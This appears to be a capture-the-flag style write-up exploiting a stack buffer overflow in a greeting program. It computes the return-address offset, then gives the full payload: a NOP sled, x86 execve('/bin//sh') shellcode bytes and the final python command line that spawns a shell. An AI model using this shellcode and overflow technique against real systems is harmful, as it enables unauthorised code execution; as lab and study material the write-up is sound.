After reversing we see that there is a buffer of 72 in the main func. Will put in this buffer[0:40] argv[1] and buffer[40:72] argv[2].
We can also see that it will read the env variable LANG and if it's 'fi', 'nl' it will modify the final string with the right greeting.
We'll see that the func greetuser will just concat strings and display the final one. (Greeting in right lang + argvs concat)

For the integrity of our tests we will work with the LANG=fi

We calculate the offset of the buffer in greetuser and see there is an offset of 76 to reach the return address of the greetuser.

We see that the greeting message in fi is 18 bytes

So the goal here is to inject our shellcode in argv[1]

Place the good offset in argv[2] and insert an address to the NOP to reach our shell code

First param must be 40 char long so 

argv[1] = '\x90'*15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
15 NOP + 25 of shellcode

argv[2] = '\x90'*18 + '\xbf\xff\xf6\x51'[::-1]
18 NOP + address somewhere in NOP of argv[1] to reach shellcode


Final buffer :
(18 bytes Finnish greeting)(40 byte)(18 bytes)(4 bytes RET_ADDR)


$(python -c "print '\x90'*15 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'") $(python -c "print('\x90'*18 + '\xbf\xff\xf6\x51'[::-1])")
